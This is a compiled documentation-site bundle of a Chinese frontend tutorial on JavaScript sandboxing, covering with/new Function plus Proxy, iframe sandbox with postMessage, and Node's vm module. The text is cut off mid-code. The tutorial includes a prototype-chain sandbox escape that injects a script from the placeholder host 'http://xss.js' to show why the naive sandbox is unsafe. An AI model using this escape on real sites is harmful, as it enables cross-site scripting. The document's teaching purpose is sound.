"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([["8071"],{7159:function(n,e,r){r.r(e),r.d(e,{default:()=>x,frontMatter:()=>l,metadata:()=>s,assets:()=>t,toc:()=>d,contentTitle:()=>o});var s=JSON.parse('{"id":"\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.2-\u6C99\u76D2\u6A21\u5F0F","title":"6.2-\u6C99\u76D2\u6A21\u5F0F","description":"Create by fall on 17 Aug 2022","source":"@site/my-docs/\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.2-\u6C99\u76D2\u6A21\u5F0F.md","sourceDirName":"\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9","slug":"/\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.2-\u6C99\u76D2\u6A21\u5F0F","permalink":"/docs/\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.2-\u6C99\u76D2\u6A21\u5F0F","draft":false,"unlisted":false,"editUrl":"https://github.com/my-docs/\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.2-\u6C99\u76D2\u6A21\u5F0F.md","tags":[],"version":"current","sidebarPosition":102,"frontMatter":{"sidebar_position":102},"sidebar":"tutorialSidebar","previous":{"title":"6.1-\u7F51\u7AD9\u5B89\u5168","permalink":"/docs/\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.1-\u7F51\u7AD9\u5B89\u5168"},"next":{"title":"6.3-\u7528\u6237\u8FFD\u8E2A","permalink":"/docs/\u5927\u524D\u7AEF\u77E5\u8BC6\u70B9/6.3-\u7528\u6237\u8FFD\u8E2A"}}'),i=r("5893"),c=r("65");let l={sidebar_position:102},o=void 0,t={},d=[{value:"\u6C99\u76D2\u6A21\u5F0F",id:"\u6C99\u76D2\u6A21\u5F0F",level:2},{value:"\u6C99\u76D2\uFF1A\u9875\u9762\u548C\u7CFB\u7EDF\u4E4B\u95F4\u7684\u9694\u79BB\u5899",id:"\u6C99\u76D2\u9875\u9762\u548C\u7CFB\u7EDF\u4E4B\u95F4\u7684\u9694\u79BB\u5899",level:2},{value:"\u6784\u5EFA\u6C99\u76D2\u73AF\u5883",id:"\u6784\u5EFA\u6C99\u76D2\u73AF\u5883",level:2},{value:"\u6C99\u7BB1\u9694\u79BB\u600E\u4E48\u505A\u7684\u4EC0\u4E48\u539F\u7406",id:"\u6C99\u7BB1\u9694\u79BB\u600E\u4E48\u505A\u7684\u4EC0\u4E48\u539F\u7406",level:2},{value:"\u6CE8\u610F",id:"\u6CE8\u610F",level:2},{value:"eval",id:"eval",level:3},{value:"new Function",id:"new-function",level:3},{value:"with",id:"with",level:3},{value:"in",id:"in",level:3},{value:"\u6C99\u7BB1\u5B9E\u73B0",id:"\u6C99\u7BB1\u5B9E\u73B0",level:2},{value:"Proxy\u6C99\u7BB1",id:"proxy\u6C99\u7BB1",level:3},{value:"\u5FEB\u7167\u6C99\u7BB1",id:"\u5FEB\u7167\u6C99\u7BB1",level:3},{value:"legacy\u6C99\u7BB1",id:"legacy\u6C99\u7BB1",level:3},{value:"CSS\u9694\u79BB",id:"css\u9694\u79BB",level:3},{value:"\u53C2\u8003\u6587\u7AE0",id:"\u53C2\u8003\u6587\u7AE0",level:2}];function a(n){let e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,c.a)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:["Create by ",(0,i.jsx)(e.strong,{children:"fall"})," on 17 Aug 2022\r\nRecently revised in 23 Oct 2023"]}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"\u6C99\u76D2\u6A21\u5F0F",children:"\u6C99\u76D2\u6A21\u5F0F"}),"\n",(0,i.jsx)(e.p,{children:"\u7B80\u5355\u6765\u8BF4\u6C99\u7BB1\uFF08sandbox\uFF09\u5C31\u662F\u4E0E\u5916\u754C\u9694\u7EDD\u7684\u4E00\u4E2A\u73AF\u5883\uFF0C\u5185\u5916\u73AF\u5883\u4E92\u4E0D\u5F71\u54CD\uFF0C\u5916\u754C\u65E0\u6CD5\u4FEE\u6539\u8BE5\u73AF\u5883\u5185\u4EFB\u4F55\u4FE1\u606F\uFF0C\u6C99\u7BB1\u5185\u7684\u4E1C\u897F\u5355\u72EC\u5C5E\u4E8E\u4E00\u4E2A\u4E16\u754C\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u628A\u4E00\u4E9B\u4E0D\u4FE1\u4EFB\u7684\u4EE3\u7801\u8FD0\u884C\u5728\u6C99\u7BB1\u4E4B\u5185\uFF0C\u4F7F\u5176\u4E0D\u80FD\u8BBF\u95EE\u6C99\u7BB1\u4E4B\u5916\u7684\u4EE3\u7801\u3002\u901A\u5E38\u5F00\u59CB\u53EF\u4EE5\u628A JavaScript \u4E2D\u5904\u7406\u6A21\u5757\u4F9D\u8D56\u5173\u7CFB\u7684\u95ED\u5305\u79F0\u4E4B\u4E3A\u6C99\u7BB1\u3002"}),"\n",(0,i.jsx)(e.h2,{id:"\u6C99\u76D2\u9875\u9762\u548C\u7CFB\u7EDF\u4E4B\u95F4\u7684\u9694\u79BB\u5899",children:"\u6C99\u76D2\uFF1A\u9875\u9762\u548C\u7CFB\u7EDF\u4E4B\u95F4\u7684\u9694\u79BB\u5899"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"\u6D4F\u89C8\u5668\u88AB\u5212\u5206\u4E3A\u6D4F\u89C8\u5668\u5185\u6838\u548C\u6E32\u67D3\u5185\u6838\u4E24\u4E2A\u6838\u5FC3\u6A21\u5757\uFF0C\u5176\u4E2D\u6D4F\u89C8\u5668\u5185\u6838\u77F3\u6CB9\u7F51\u7EDC\u8FDB\u7A0B\u3001\u6D4F\u89C8\u5668\u4E3B\u8FDB\u7A0B\u548C GPU \u8FDB\u7A0B\u7EC4\u6210\u7684\uFF0C\u6E32\u67D3\u5185\u6838\u5C31\u662F\u6E32\u67D3\u8FDB\u7A0B\uFF1B"}),"\n",(0,i.jsx)(e.li,{children:"\u6D4F\u89C8\u5668\u4E2D\u7684\u5B89\u5168\u6C99\u7BB1\u662F\u5229\u7528\u64CD\u4F5C\u7CFB\u7EDF\u63D0\u4F9B\u7684\u5B89\u5168\u6280\u672F\uFF0C\u8BA9\u6E32\u67D3\u8FDB\u7A0B\u5728\u6267\u884C\u8FC7\u7A0B\u4E2D\u65E0\u6CD5\u8BBF\u95EE\u6216\u8005\u4FEE\u6539\u64CD\u4F5C\u7CFB\u7EDF\u4E2D\u7684\u6570\u636E\uFF0C\u5728\u6E32\u67D3\u8FDB\u7A0B\u9700\u8981\u8BBF\u95EE\u7CFB\u7EDF\u8D44\u6E90\u7684\u65F6\u5019\uFF0C\u9700\u8981\u901A\u8FC7\u6D4F\u89C8\u5668\u5185\u6838\u6765\u5B9E\u73B0\uFF0C\u7136\u540E\u5C06\u8BBF\u95EE\u7684\u7ED3\u679C\u901A\u8FC7 IPC \u8F6C\u53D1\u7ED9\u6E32\u67D3\u8FDB\u7A0B\uFF1B"}),"\n",(0,i.jsx)(e.li,{children:"\u7AD9\u70B9\u9694\u79BB\uFF08Site Isolation\uFF09\u5C06\u540C\u4E00\u7AD9\u70B9\uFF08\u5305\u542B\u76F8\u540C\u6839\u57DF\u540D\u548C\u76F8\u540C\u534F\u8BAE\u7684\u5730\u5740\uFF09\u4E2D\u76F8\u4E92\u5173\u8054\u7684\u9875\u9762\u653E\u5230\u540C\u4E00\u4E2A\u6E32\u67D3\u8FDB\u7A0B\u4E2D\u6267\u884C\uFF1B"}),"\n",(0,i.jsx)(e.li,{children:"\u5B9E\u73B0\u7AD9\u70B9\u9694\u79BB\uFF0C\u5C31\u53EF\u4EE5\u5C06\u6076\u610F\u7684 iframe \u9694\u79BB\u5728\u6076\u610F\u8FDB\u7A0B\u5185\u90E8\uFF0C\u4F7F\u5F97\u5B83\u65E0\u6CD5\u7EE7\u7EED\u8BBF\u95EE\u5176\u4ED6 iframe \u8FDB\u7A0B\u7684\u5185\u5BB9\uFF0C\u56E0\u6B64\u65E0\u6CD5\u653B\u51FB\u5176\u4ED6\u7AD9\u70B9\uFF1B"}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"\u6784\u5EFA\u6C99\u76D2\u73AF\u5883",children:"\u6784\u5EFA\u6C99\u76D2\u73AF\u5883"}),"\n",(0,i.jsx)(e.p,{children:"\u4E00\u822C\u6765\u8BB2\uFF0C\u95ED\u5305\u5C31\u662F\u4E00\u4E2A\u6C99\u76D2\u73AF\u5883"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-js",children:"((window)=>{\r\n    var a = 10\r\n    console.log(a) // 10\r\n})(window)\r\nconsole.log(a) // error ,\u65E0\u6CD5\u4ECE\u5916\u90E8\u8BBF\u95EE\u5230 a\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6A21\u62DF\u539F\u751F\u6D4F\u89C8\u5668\u5BF9\u8C61\u7684\u76EE\u7684\u662F\u4E3A\u4E86\uFF0C\u9632\u6B62\u64CD\u4F5C\u539F\u751F\u5BF9\u8C61\u3002"}),"\n",(0,i.jsx)(e.h2,{id:"\u6C99\u7BB1\u9694\u79BB\u600E\u4E48\u505A\u7684\u4EC0\u4E48\u539F\u7406",children:"\u6C99\u7BB1\u9694\u79BB\u600E\u4E48\u505A\u7684\u4EC0\u4E48\u539F\u7406"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u6C99\u7BB1\uFF0C\u5373sandbox\uFF0C\u987E\u540D\u601D\u4E49\uFF0C\u5C31\u662F\u8BA9\u4F60\u7684\u7A0B\u5E8F\u8DD1\u5728\u4E00\u4E2A\u9694\u79BB\u7684\u73AF\u5883\u4E0B\uFF0C\u4E0D\u5BF9\u5916\u754C\u7684\u5176\u4ED6\u7A0B\u5E8F\u9020\u6210\u5F71\u54CD\uFF0C\u901A\u8FC7\u521B\u5EFA\u7C7B\u4F3C\u6C99\u76D2\u7684\u72EC\u7ACB\u4F5C\u4E1A\u73AF\u5883\uFF0C\u5728\u5176\u5185\u90E8\u8FD0\u884C\u7684\u7A0B\u5E8F\u5E76\u4E0D\u80FD\u5BF9\u786C\u76D8\u4EA7\u751F\u6C38\u4E45\u6027\u7684\u5F71\u54CD\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u5B9E\u73B0\u6C99\u7BB1\u7684\u4E09\u79CD\u65B9\u6CD5"}),"\n",(0,i.jsxs)(e.ol,{children:["\n",(0,i.jsx)(e.li,{children:"\u200B		\u501F\u52A9with + new Function"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u200B	 \u9996\u5148\u4ECE\u6700\u7B80\u964B\u7684\u65B9\u6CD5\u8BF4\u8D77\uFF0C\u5047\u5982\u4F60\u60F3\u8981\u901A\u8FC7eval\u548Cfunction\u76F4\u63A5\u6267\u884C\u4E00\u6BB5\u4EE3\u7801\uFF0C\u8FD9\u662F\u4E0D\u73B0\u5B9E\u7684\uFF0C\u56E0\u4E3A\u4EE3\u7801\u5185\u90E8\u53EF\u4EE5\u6CBF\u7740\u4F5C\u7528\u57DF\u94FE\u5F80\u4E0A\u627E\uFF0C\u7BE1\u6539\u5168\u5C40\u53D8\u91CF\uFF0C\u8FD9\u662F\u6211\u4EEC\u4E0D\u5E0C\u671B\u7684\uFF0C\u6240\u4EE5\u4F60\u9700\u8981\u8BA9\u6C99\u7BB1\u5185\u7684\u53D8\u91CF\u8BBF\u95EE\u90FD\u5728\u4F60\u7684\u76D1\u63A7\u8303\u56F4\u5185\uFF1B\u4E0D\u8FC7\uFF0C\u4F60\u53EF\u4EE5\u4F7F\u7528with API\uFF0C\u5728with\u7684\u5757\u7EA7\u4F5C\u7528\u57DF\u4E0B\uFF0C\u53D8\u91CF\u8BBF\u95EE\u4F1A\u4F18\u5148\u67E5\u627E\u4F60\u4F20\u5165\u7684\u53C2\u6570\u5BF9\u8C61\uFF0C\u4E4B\u540E\u518D\u5F80\u4E0A\u627E\uFF0C\u6240\u4EE5\u76F8\u5F53\u4E8E\u4F60\u53D8\u76F8\u76D1\u63A7\u5230\u4E86\u4EE3\u7801\u4E2D\u7684\u201C\u53D8\u91CF\u8BBF\u95EE\u201D\uFF1A"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"function compileCode (src) {      \r\n  src = 'with (exposeObj) {' + src + '}'    \r\n  return new Function('exposeObj', src)     \r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u63A5\u4E0B\u91CC\u4F60\u8981\u505A\u7684\u662F\uFF0C\u5C31\u662F\u66B4\u9732\u53EF\u4EE5\u88AB\u8BBF\u95EE\u7684\u53D8\u91CFexposeObj\uFF0C\u4EE5\u53CA\u963B\u65AD\u6C99\u7BB1\u5185\u7684\u5BF9\u5916\u8BBF\u95EE\u3002\u901A\u8FC7es6\u63D0\u4F9B\u7684proxy\u7279\u6027\uFF0C\u53EF\u4EE5\u83B7\u53D6\u5230\u5BF9\u5BF9\u8C61\u4E0A\u7684\u6240\u6709\u6539\u5199\uFF1A"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:'function compileCode (src) {      \r\n  src = `with (exposeObj) { ${src} }`    \r\n  return new Function(\'exposeObj\', src)     \r\n}    \r\nfunction proxyObj(originObj){    \r\n    let exposeObj = new Proxy(originObj,{    \r\n        has:(target,key)=>{    \r\n            if(["console","Math","Date"].indexOf(key)>=0){    \r\n                return target[key]    \r\n            }    \r\n            if(!target.hasOwnProperty(key)){    \r\n                throw new Error(`Illegal operation for key ${key}`)    \r\n            }    \r\n            return target[key]    \r\n        },\r\n    })    \r\n    return exposeObj    \r\n\r\n}    \r\nfunction createSandbox(src,obj){    \r\n let proxy = proxyObj(obj)    \r\n compileCode(src).call(proxy,proxy) //\u7ED1\u5B9Athis \u9632\u6B62this\u8BBF\u95EEwindow    \r\n}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	 \u901A\u8FC7\u8BBE\u7F6Ehas\u51FD\u6570\uFF0C\u53EF\u4EE5\u76D1\u542C\u5230\u53D8\u91CF\u7684\u8BBF\u95EE\uFF0C\u5728\u4E0A\u8FF0\u4EE3\u7801\u4E2D\uFF0C\u4EC5\u66B4\u9732\u4E2A\u522B\u5916\u90E8\u53D8\u91CF\u4F9B\u4EE3\u7801\u8BBF\u95EE\uFF0C\u5176\u4F59\u4E0D\u5B58\u5728\u7684\u5C5E\u6027\uFF0C\u90FD\u4F1A\u76F4\u63A5\u629B\u51FAerror\u3002\u5176\u5B9E\u8FD8\u5B58\u5728get\u3001set\u51FD\u6570\uFF0C\u4F46\u662F\u5982\u679Cget\u548Cset\u51FD\u6570\u53EA\u80FD\u62E6\u622A\u5230\u5F53\u524D\u5BF9\u8C61\u5C5E\u6027\u7684\u64CD\u4F5C\uFF0C\u5BF9\u5916\u90E8\u53D8\u91CF\u5C5E\u6027\u7684\u8BFB\u5199\u64CD\u4F5C\u65E0\u6CD5\u76D1\u542C\u5230\uFF0C\u6240\u4EE5\u53EA\u80FD\u4F7F\u7528has\u51FD\u6570\u4E86\u3002\u63A5\u4E0B\u6765\u6211\u4EEC\u6D4B\u8BD5\u4E00\u4E0B\uFF1A"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"const testObj = {    \r\n    value:1,    \r\n    a:{    \r\n        b:    \r\n    }    \r\n}    \r\ncreateSandbox(\"value='haha';console.log(a)\",testObj)\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u200B	\u770B\u8D77\u6765\u4E00\u5207\u4F3C\u4E4E\u6CA1\u6709\u4EC0\u4E48\u95EE\u9898\uFF0C\u4F46\u662F\u95EE\u9898\u51FA\u5728\u4E86\u4F20\u5165\u7684\u5BF9\u8C61\uFF0C\u5F53\u8C03\u7528\u7684\u662Fconsole.log(a.b)\u7684\u65F6\u5019\uFF0Chas\u65B9\u6CD5\u662F\u65E0\u6CD5\u76D1\u542C\u5230\u5BF9b\u5C5E\u6027\u7684\u8BBF\u95EE\u7684\uFF0C\u5047\u8BBE\u6240\u6267\u884C\u7684\u4EE3\u7801\u662F\u4E0D\u53EF\u4FE1\u7684\uFF0C\u8FD9\u65F6\u5019\uFF0C\u5B83\u53EA\u9700\u8981\u901A\u8FC7a.b.",(0,i.jsx)(e.strong,{children:"proto"}),"\u5C31\u53EF\u4EE5\u8BBF\u95EE\u5230Object\u6784\u9020\u51FD\u6570\u7684\u539F\u578B\u5BF9\u8C61\uFF0C\u518D\u5BF9\u539F\u578B\u5BF9\u8C61\u8FDB\u884C\u4E00\u4E9B\u7BE1\u6539\uFF0C\u4F8B\u5982\u5C06toString\u5C31\u80FD\u5F71\u54CD\u5230\u5916\u90E8\u7684\u4EE3\u7801\u903B\u8F91\u7684\u3002"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"createSandbox(`    \r\na.b.__proto__.toString = ()=>{    \r\n new (()=>{}).constructor(\"var script = document.createElement('script');    \r\n script.src = 'http://xss.js';\r\n script.type = 'text/javascript';    \r\n document.body.appendChild(script);\")()    \r\n}\r\n`,testObj)    \r\nconsole.log(testObj.a.b.__proto__.toString())\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	 \u4F8B\u5982\u4E0A\u9762\u6240\u5C55\u793A\u7684\u4EE3\u7801\uFF0C\u901A\u8FC7\u8BBF\u95EE\u539F\u578B\u94FE\u7684\u65B9\u5F0F\uFF0C\u5B9E\u73B0\u4E86\u6C99\u7BB1\u9003\u9038\uFF0C\u5E76\u4E14\u7BE1\u6539\u4E86\u539F\u578B\u94FE\u4E0A\u7684toString\u65B9\u6CD5\uFF0C\u4E00\u65E6\u5916\u90E8\u7684\u4EE3\u7801\u6267\u884C\u4E86toString\u65B9\u6CD5\uFF0C\u5C31\u53EF\u4EE5\u5B9E\u73B0xss\u653B\u51FB\uFF0C\u6CE8\u5165\u7B2C\u4E09\u65B9\u4EE3\u7801\uFF1B\u7531\u4E8E\u5728\u5185\u90E8\u5B9A\u4E49\u6267\u884C\u7684\u51FD\u6570\u4EE3\u7801\u903B\u8F91\uFF0C\u4ECD\u7136\u4F1A\u6CBF\u7740\u4F5C\u7528\u4E8E\u94FE\u67E5\u627E\uFF0C\u4E3A\u4E86\u7ED5\u5F00\u4F5C\u7528\u57DF\u94FE\u7684\u67E5\u627E\uFF0C\u7B14\u8005\u901A\u8FC7\u8BBF\u95EE\u7BAD\u5934\u51FD\u6570\u7684constructor\u7684\u65B9\u5F0F\u62FF\u5230\u4E86\u6784\u9020\u51FD\u6570Function\uFF0C\u8FD9\u4E2A\u65F6\u5019\uFF0CFuntion\u5185\u6240\u6267\u884C\u7684xss\u4EE3\u7801\uFF0C\u5728\u6267\u884C\u7684\u65F6\u5019\uFF0C\u4FBF\u4E0D\u4F1A\u518D\u6CBF\u7740\u4F5C\u7528\u57DF\u94FE\u5F80\u4E0A\u627E\uFF0C\u800C\u662F\u76F4\u63A5\u5728\u5168\u5C40\u4F5C\u7528\u57DF\u4E0B\u6267\u884C\uFF0C\u901A\u8FC7\u8FD9\u6837\u7684\u65B9\u5F0F\uFF0C\u5B9E\u73B0\u4E86\u6C99\u7BB1\u9003\u9038\u4EE5\u53CAxss\u653B\u51FB\u3002"}),"\n",(0,i.jsxs)(e.p,{children:["\u200B	\u4F60\u53EF\u80FD\u4F1A\u60F3\uFF0C\u5982\u679C\u6211\u5207\u65AD\u539F\u578B\u94FE\u7684\u8BBF\u95EE\uFF0C\u662F\u5426\u5C31\u675C\u7EDD\u4E86\u5462\uFF1F\u7684\u786E\uFF0C\u4F60\u53EF\u4EE5\u901A\u8FC7Object.create(null)\u7684\u65B9\u5F0F\uFF0C\u4F20\u5165\u4E00\u4E2A\u4E0D\u542B\u6709\u539F\u578B\u94FE\u7684\u5BF9\u8C61\uFF0C\u5E76\u4E14\u8BA9\u66B4\u9732\u7684\u5BF9\u8C61\u53EA\u6709\u4E00\u5C42\uFF0C\u4E0D\u4F20\u5165\u5D4C\u5957\u7684\u5BF9\u8C61\uFF0C\u4F46\u662F\uFF0C\u5373\u4F7F\u662F\u57FA\u672C\u7C7B\u578B\u503C\uFF0C\u6570\u5B57\u6216\u5B57\u7B26\u4E32\uFF0C\u540C\u6837\u4E5F\u53EF\u4EE5\u901A\u8FC7",(0,i.jsx)(e.strong,{children:"proto"}),"\u67E5\u627E\u5230\u539F\u578B\u94FE\uFF0C\u800C\u4E14\uFF0C\u5373\u4F7F\u4E0D\u4F20\u5165\u5BF9\u8C61\uFF0C\u4F60\u8FD8\u53EF\u4EE5\u901A\u8FC7\u4E0B\u9762\u8FD9\u79CD\u65B9\u5F0F\u7ED5\u8FC7\uFF1A"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"({}).__proto__.toString= ()=>{console.log(111)};\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u53EF\u89C1\uFF0Cnew Function + with\u7684\u8FD9\u79CD\u6C99\u7BB1\u65B9\u5F0F\uFF0C\u9632\u541B\u5B50\u4E0D\u9632\u5C0F\u4EBA\uFF0C\u5F53\u7136\uFF0C\u4F60\u4E5F\u53EF\u4EE5\u901A\u8FC7\u5BF9\u4F20\u5165\u7684code\u4EE3\u7801\u505A\u4EE3\u7801\u5206\u6790\u6216\u8FC7\u6EE4\uFF1F\u5047\u5982\u4F20\u5165\u7684\u4EE3\u7801\u4E0D\u662F\u6309\u7167\u7684\u89C4\u5B9A\u7684\u6570\u636E\u683C\u5F0F\uFF08\u4F8B\u5982json\uFF09\uFF0C\u5C31\u76F4\u63A5\u629B\u51FA\u9519\u8BEF\uFF0C\u963B\u6B62\u6076\u610F\u4EE3\u7801\u6CE8\u5165\uFF0C\u4F46\u8FD9\u59CB\u7EC8\u4E0D\u662F\u4E00\u79CD\u5B89\u5168\u7684\u505A\u6CD5\u3002"}),"\n",(0,i.jsxs)(e.ol,{children:["\n",(0,i.jsx)(e.li,{children:"\u200B		\u501F\u52A9iframe\u5B9E\u73B0\u6C99\u7BB1"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u524D\u9762\u4ECB\u7ECD\u4E00\u79CD\u52A3\u8D28\u7684\u3001\u4E0D\u600E\u4E48\u5B89\u5168\u7684\u65B9\u6CD5\u6784\u9020\u4E86\u4E00\u4E2A\u7B80\u5355\u7684\u6C99\u7BB1\uFF0C\u4F46\u662F\u5728\u524D\u7AEF\u6700\u5E38\u89C1\u7684\u65B9\u6CD5\uFF0C\u8FD8\u662F\u5229\u7528iframe\u6765\u6784\u9020\u4E00\u4E2A\u6C99\u7BB1"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:'<iframe sandbox src="..."></iframe>\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u4F46\u662F\u8FD9\u4E5F\u4F1A\u5E26\u6765\u4E00\u4E9B\u9650\u5236\uFF1A"}),"\n",(0,i.jsxs)(e.ol,{children:["\n",(0,i.jsxs)(e.li,{children:["\n",(0,i.jsx)(e.p,{children:"\u200B			script\u811A\u672C\u4E0D\u80FD\u6267\u884C"}),"\n"]}),"\n",(0,i.jsxs)(e.li,{children:["\n",(0,i.jsx)(e.p,{children:"\u200B			\u4E0D\u80FD\u53D1\u9001ajax\u8BF7\u6C42"}),"\n"]}),"\n",(0,i.jsxs)(e.li,{children:["\n",(0,i.jsx)(e.p,{children:"\u200B			\u4E0D\u80FD\u4F7F\u7528\u672C\u5730\u5B58\u50A8\uFF0C\u5373localStorage,cookie\u7B49"}),"\n"]}),"\n",(0,i.jsxs)(e.li,{children:["\n",(0,i.jsx)(e.p,{children:"\u200B			\u4E0D\u80FD\u521B\u5EFA\u65B0\u7684\u5F39\u7A97\u548Cwindow"}),"\n"]}),"\n",(0,i.jsxs)(e.li,{children:["\n",(0,i.jsx)(e.p,{children:"\u200B			\u4E0D\u80FD\u53D1\u9001\u8868\u5355"}),"\n"]}),"\n",(0,i.jsxs)(e.li,{children:["\n",(0,i.jsx)(e.p,{children:"\u200B			\u4E0D\u80FD\u52A0\u8F7D\u989D\u5916\u63D2\u4EF6\u6BD4\u5982flash\u7B49"}),"\n",(0,i.jsx)(e.p,{children:"\u200B			\u4E0D\u8FC7\u522B\u65B9\uFF0C\u4F60\u53EF\u4EE5\u5BF9\u8FD9\u4E2Aiframe\u6807\u7B7E\u8FDB\u884C\u4E00\u4E9B\u914D\u7F6E\uFF1A"}),"\n",(0,i.jsxs)(e.p,{children:["\u200B			",(0,i.jsx)(e.img,{src:"https://uploadfiles.nowcoder.com/images/20220301/4107856_1646122570684/3FD065D9D9BD5924FC83D859A251A3C9",alt:"img"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u63A5\u4E0B\u91CC\u4F60\u53EA\u9700\u8981\u7ED3\u5408postMessage API\uFF0C\u5C06\u4F60\u9700\u8981\u6267\u884C\u7684\u4EE3\u7801\uFF0C\u548C\u9700\u8981\u66B4\u9732\u7684\u6570\u636E\u4F20\u9012\u8FC7\u53BB\uFF0C\u7136\u540E\u548C\u4F60\u7684iframe\u9875\u9762\u901A\u4FE1\u5C31\u884C\u4E86\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	 1\uFF09\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF0C\u5728\u5B50\u9875\u9762\u4E2D\uFF0C\u8981\u6CE8\u610F\u4E0D\u8981\u8BA9\u6267\u884C\u4EE3\u7801\u8BBF\u95EE\u5230contentWindow\u5BF9\u8C61\uFF0C\u56E0\u4E3A\u4F60\u9700\u8981\u8C03\u7528contentWindow\u7684postMessageAPI\u7ED9\u7236\u9875\u9762\u4F20\u9012\u4FE1\u606F\uFF0C\u5047\u5982\u6076\u610F\u4EE3\u7801\u4E5F\u83B7\u53D6\u5230\u4E86contentWindow\u5BF9\u8C61\uFF0C\u76F8\u5F53\u4E8E\u5C31\u62FF\u5230\u4E86\u7236\u9875\u9762\u7684\u63A7\u5236\u6743\u4E86\uFF0C\u8FD9\u4E2A\u65F6\u5019\u53EF\u5927\u4E8B\u4E0D\u5999\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	 2\uFF09\u5F53\u4F7F\u7528postMessageAPI\u7684\u65F6\u5019\uFF0C\u7531\u4E8Esandbox\u7684origin\u9ED8\u8BA4\u4E3Anull\uFF0C\u9700\u8981\u8BBE\u7F6Eallow-same-origin\u5141\u8BB8\u4E24\u4E2A\u9875\u9762\u8FDB\u884C\u901A\u4FE1\uFF0C\u610F\u5473\u7740\u5B50\u9875\u9762\u5185\u53EF\u4EE5\u53D1\u8D77\u8BF7\u6C42\uFF0C\u8FD9\u65F6\u5019\u9700\u8981\u9632\u8303\u597DCSRF\uFF0C\u5141\u8BB8\u4E86\u540C\u57DF\u8BF7\u6C42\uFF0C\u4E0D\u8FC7\u597D\u5728\uFF0C\u5E76\u6CA1\u6709\u643A\u5E26\u4E0Acookie\u3002"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	3\uFF09\u5F53\u8C03\u7528postMessageAPI\u4F20\u9012\u6570\u636E\u7ED9\u5B50\u9875\u9762\u7684\u65F6\u5019\uFF0C\u4F20\u8F93\u7684\u6570\u636E\u5BF9\u8C61\u672C\u8EAB\u5DF2\u7ECF\u901A\u8FC7\u7ED3\u6784\u5316\u514B\u9686\u7B97\u6CD5\u590D\u5236"}),"\n",(0,i.jsx)(e.p,{children:"\u200B	\u7B80\u5355\u7684\u8BF4\uFF0C\u901A\u8FC7postMessageAPI\u4F20\u9012\u7684\u5BF9\u8C61\uFF0C\u5DF2\u7ECF\u7531\u6D4F\u89C8\u5668\u5904\u7406\u8FC7\u4E86\uFF0C\u539F\u578B\u94FE\u5DF2\u7ECF\u88AB\u5207\u65AD\uFF0C\u540C\u65F6\uFF0C\u4F20\u8FC7\u53BB\u7684\u5BF9\u8C61\u4E5F\u662F\u590D\u5236\u597D\u4E86\u7684\uFF0C\u5360\u7528\u7684\u662F\u4E0D\u540C\u7684\u5185\u5B58\u7A7A\u95F4\uFF0C\u4E24\u8005\u4E92\u4E0D\u5F71\u54CD\uFF0C\u6240\u4EE5\u4F60\u4E0D\u9700\u8981\u62C5\u5FC3\u51FA\u73B0\u7B2C\u4E00\u79CD\u6C99\u7BB1\u505A\u6CD5\u4E2D\u51FA\u73B0\u7684\u95EE\u9898\u3002"}),"\n",(0,i.jsxs)(e.ol,{children:["\n",(0,i.jsx)(e.li,{children:"\u200B		nodejs\u4E2D\u7684\u6C99\u7BB1"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u200B	nodejs\u4E2D\u4F7F\u7528\u6C99\u7BB1\u5F88\u7B80\u5355\uFF0C\u53EA\u9700\u8981\u5229\u7528\u539F\u751F\u7684vm\u6A21\u5757\uFF0C\u4FBF\u53EF\u4EE5\u5FEB\u901F\u521B\u5EFA\u6C99\u7BB1\uFF0C\u540C\u65F6\u6307\u5B9A\u4E0A\u4E0B\u6587\u3002"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-javascript",children:"const vm = require('vm');    \r\nconst x = 1;    \r\nconst sandbox = { x: 2 };    \r\nvm.createContext(sandbox); // Contextify the sandbox.    \r\nconst code = 'x += 40; var y = 17;';    \r\nvm.runInContext(code, 